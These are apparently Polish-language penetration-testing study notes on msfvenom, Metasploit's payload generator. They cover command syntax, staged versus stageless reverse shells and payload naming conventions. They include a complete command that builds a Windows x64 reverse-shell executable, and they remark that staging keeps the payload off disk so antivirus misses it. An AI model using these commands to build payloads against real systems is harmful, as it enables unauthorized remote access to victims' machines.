Część metasploit, jest używany głównie do tworzenia kodu reverse i bind shell. Jest mocno wykorzystywany do tworzenia low-level exploitów i generowania payloadów różnego formatu (exe, aspx, war, py)

## Syntax

Standardowo `msfvenom -p <PAYLOAD> <OPTIONS>`
Tworząc Windows x64 reverse shell w exe będzie to tak:
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
- -f fromat - format, tutaj exe
- -o file - miejsce i nazwa stworzonego payloadu
- LHOST=IP - IP urządzenia do którego zaatakowana maszyna będzie się łączyć (z reguły nasz pc)
- LPORT=PORT - port urządzenia do którego zaatakowana maszyna będzie się łączyć (z reguły nasz pc)

## Staged vs Stagless

Są dwa rodzaje tych rev shell:
- Staged - payload wysyłany jest w dwóch częściach, pierwsza to stager, wykonuje się bezpośrednio na serwerze i łączy z powrotem do listenera ale nie zawiera kodu reverse shell. Dalej po połączeniu dopiero ładuje się i wykonuje ten payload i to jest po to żeby ten payload nie był zapisany na dysku żeby antywirus go nie wychwycił.
- Stageless - na strzała payload leci, to co najczęściej się robi.

## Payload naming conventions

W msfvenom tak się najczęściej znajduje payloady `<OS>/<arch>/<payload>`
np. `linux/x86/shell_reverse_tcp`
Wyjątek to 32bit windows bo jest tak: `windows/shell_reverse_tcp` a 64bit ma /x64 dopisek

Stageless mają payload oddzielony `_` tak jak tutaj `shell_reverse_tcp`
Staged wygląda tak: `shell/reverse_tcp` - staged jest z `/`
To samo tyczy się meterpretera, staged - `windows/x64/meterpreter/reverse_tcp`
stagless linux 32bit - `linux/x86/meterpreter_reverse_tcp`

Wylistowanie wszystkich dostępnych payloadów `msfvenom --list payloads` moża pipe z grepem.